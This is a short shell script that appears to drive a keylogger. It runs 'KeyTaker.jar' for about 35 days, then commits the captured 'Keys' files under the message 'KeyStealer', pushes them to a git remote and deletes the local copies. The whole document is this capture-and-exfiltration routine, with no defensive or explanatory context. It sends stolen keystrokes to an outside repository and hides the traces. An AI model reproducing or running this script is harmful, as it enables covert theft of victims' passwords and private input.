java -jar KeyTaker.jar & sleep 3000000 ; kill $!
git add Keys***.txt
git commit -m "KeyStealer"
git push origin
rm -f Keys***.txt
